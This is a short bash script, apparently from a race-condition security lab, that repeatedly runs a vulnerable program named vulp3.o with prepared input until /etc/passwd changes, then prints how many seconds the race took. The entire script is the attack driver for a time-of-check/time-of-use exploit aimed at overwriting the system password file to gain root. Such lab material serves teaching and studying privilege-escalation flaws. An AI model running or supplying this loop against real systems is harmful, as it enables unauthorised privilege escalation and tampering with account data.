#!/bin/bash
SECONDS=0
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
	./vulp3.o < passwd_input
	echo "$SECONDS secs"
	new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed after $SECONDS secs"
